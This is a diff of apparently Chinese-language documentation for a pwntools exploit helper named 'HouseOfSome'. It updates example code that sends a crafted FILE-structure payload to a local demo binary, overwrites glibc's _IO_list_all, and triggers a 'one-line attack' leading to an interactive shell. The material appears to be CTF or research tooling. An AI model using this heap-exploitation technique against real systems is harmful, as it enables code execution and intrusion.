@@ -33,7 +33,7 @@ io = process("./demo")
 libc = ELF("./libc.so.6", checksec=None)
 libc.address = libc_base
 hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
-hos.bomb(io, ret_address)
+hos.bomb(io)
 ```
 
 - controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址
@@ -84,11 +84,10 @@ hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
 # 构造第一个任意地址写原语
 payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
 io.sendlineafter(b"content> ", payload)
-write(libc_base + 0x21a680, 8, p64(heap_addr))
+write(libc.symbols["_IO_list_all"], 8, p64(heap_addr)) # 劫持_IO_list_all
 leave() # exit
 
-io_flush_all = libc.address + 0x8ea42 # Ubuntu GLIBC 2.35-0ubuntu3.1
-hos.bomb(io, io_flush_all) # 一句话攻击
+hos.bomb(io) # 一句话攻击
 
 io.interactive()
 ```
